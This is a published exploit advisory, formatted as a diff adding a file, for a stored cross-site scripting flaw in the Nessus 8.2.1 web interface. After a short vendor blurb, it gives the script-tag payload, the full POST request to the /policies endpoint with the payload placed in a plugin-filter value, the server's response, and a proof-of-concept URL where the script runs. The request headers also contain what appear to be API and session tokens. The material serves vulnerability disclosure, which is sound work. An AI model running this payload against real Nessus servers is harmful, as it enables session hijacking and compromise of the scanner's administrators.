@@ -1,0 +1,75 @@
+##################################################################################################################################
+# Exploit Title: Nessus 8.2.1 | Stored Cross-Site Scripting
+# Date: 29.01.2019
+# Exploit Author: Ozer Goker
+# Vendor Homepage: https://www.tenable.com
+# Software Link: https://www.tenable.com/downloads/nessus
+# Version: 8.2.1
+##################################################################################################################################
+
+Introduction
+Nessus is #1 For Vulnerability Assessment
+
+From the beginning, we've worked hand-in-hand with the security community. We continuously optimize Nessus based on community feedback to make it the most accurate and comprehensive vulnerability assessment solution in the market. 20 years later and we're still laser focused on community collaboration and product innovation to provide the most accurate and complete vulnerability data - so you don't miss critical issues which could put your organization at risk.
+
+
+#################################################################################
+
+
+XSS details: Stored
+
+#################################################################################
+
+XSS1 | Stored
+
+URL
+https://localhost:8834/policies
+
+METHOD
+Post
+
+PARAMETER
+value
+
+PAYLOAD
+\"><script>alert(1)</script>
+
+
+Request
+
+POST /policies HTTP/1.1
+Host: localhost:8834
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://localhost:8834/
+Content-Type: application/json
+X-API-Token: 9A8BB6D6-2297-47EF-8083-D1EC639444B4
+X-Cookie: token=7856d1d4dfdeb394d00a3993b6c3829df42ba6dbebbcac45
+Content-Length: 3467
+DNT: 1
+Connection: close
+
+{"uuid":"939a2145-95e3-0c3f-f1cc-761db860e4eed37b6eee77f9e101","dynamicPluginFilters":{"joinOperator":"and","filters":[{"filter":"cve","quality":"eq","value":"\"><script>alert(1)</script>"}]},"credentials":{"add":{},"edit":{},"delete":[]},"settings":{"patch_audit_over_rexec":"no","patch_audit_over_rsh":"no","patch_audit_over_telnet":"no","additional_snmp_port3":"161","additional_snmp_port2":"161","additional_snmp_port1":"161","snmp_port":"161","http_login_auth_regex_nocase":"no","http_login_auth_regex_on_headers":"no","http_login_invert_auth_regex":"no","http_login_max_redir":"0","http_reauth_delay":"","http_login_method":"POST","enable_admin_shares":"no","start_remote_registry":"no","dont_use_ntlmv1":"yes","never_send_win_creds_in_the_clear":"yes","attempt_least_privilege":"no","ssh_client_banner":"OpenSSH_5.0","ssh_port":"22","ssh_known_hosts":"","region_hkg_pref_name":"yes","region_syd_pref_name":"yes","region_lon_pref_name":"yes","region_iad_pref_name":"yes","region_ord_pref_name":"yes","region_dfw_pref_name":"yes","microsoft_azure_subscriptions_ids":"","aws_use_https":"yes","aws_verify_ssl":"yes","aws_ui_region_type":"Rest of the World","aws_sa_east_1":"","aws_ap_south_1":"","aws_ap_southeast_2":"","aws_ap_southeast_1":"","aws_ap_northeast_3":"","aws_ap_northeast_2":"","aws_ap_northeast_1":"","aws_eu_north_1":"","aws_eu_central_1":"","aws_eu_west_3":"","aws_eu_west_2":"","aws_eu_west_1":"","aws_ca_central_1":"","aws_us_west_2":"","aws_us_west_1":"","aws_us_east_2":"","aws_us_east_1":"","enable_plugin_list":"no","audit_trail":"full","enable_plugin_debugging":"no","log_whole_attack":"no","max_simult_tcp_sessions_per_scan":"","max_simult_tcp_sessions_per_host":"","max_hosts_per_scan":"30","max_checks_per_host":"5","network_receive_timeout":"5","reduce_connections_on_congestion":"no","slice_network_addresses":"no","stop_scan_on_disconnect":"no","safe_checks":"yes","display_unreachable_hosts":"no","log_live_hosts":"no","reverse_lookup":"no","allow_post_scan_editing":"yes","silent_dependencies":"yes","report_superseded_patches":"yes","report_verbosity":"Normal","scan_malware":"no","enum_local_users_end_uid":"1200","enum_local_users_start_uid":"1000","enum_domain_users_end_uid":"1200","enum_domain_users_start_uid":"1000","request_windows_domain_info":"yes","scan_webapps":"no","test_default_oracle_accounts":"no","provided_creds_only":"yes","smtp_to":"postmaster@[AUTO_REPLACED_IP]","smtp_from":"nobody@example.com","smtp_domain":"example.com","av_grace_period":"0","thorough_tests":"no","report_paranoia":"Normal","detect_ssl":"yes","check_crl":"no","enumerate_all_ciphers":"yes","cert_expiry_warning_days":"60","ssl_prob_ports":"Known SSL ports","svc_detection_on_all_ports":"yes","udp_scanner":"no","syn_scanner":"yes","syn_firewall_detection":"Automatic (normal)","verify_open_ports":"no","only_portscan_if_enum_failed":"yes","snmp_scanner":"yes","wmi_netstat_scanner":"yes","ssh_netstat_scanner":"yes","portscan_range":"default","unscanned_closed":"no","wol_wait_time":"5","wol_mac_addresses":"","scan_ot_devices":"no","scan_netware_hosts":"no","scan_network_printers":"no","ping_the_remote_host":"yes","udp_ping":"no","icmp_ping":"yes","icmp_ping_retries":"2","icmp_unreach_means_host_down":"no","tcp_ping":"yes","tcp_ping_dest_ports":"built-in","arp_ping":"yes","fast_network_discovery":"no","test_local_nessus_host":"yes","acls":[{"object_type":"policy","permissions":0,"type":"default"}],"description":"","name":"test"}}
+
+Response
+
+HTTP/1.1 200 OK
+Cache-Control:
+X-Frame-Options: DENY
+Content-Type: application/json
+Date: : Tue, 29 Jan 2019 12:44:04 GMT
+Connection: close
+Server: NessusWWW
+X-Content-Type-Options: nosniff
+Content-Length: 38
+Expires: 0
+Pragma:
+
+{"policy_id":161,"policy_name":"test"}
+
+
+PoC
+URL
+https://localhost:8834/#/scans/policies/161/config/dynamic-plugins
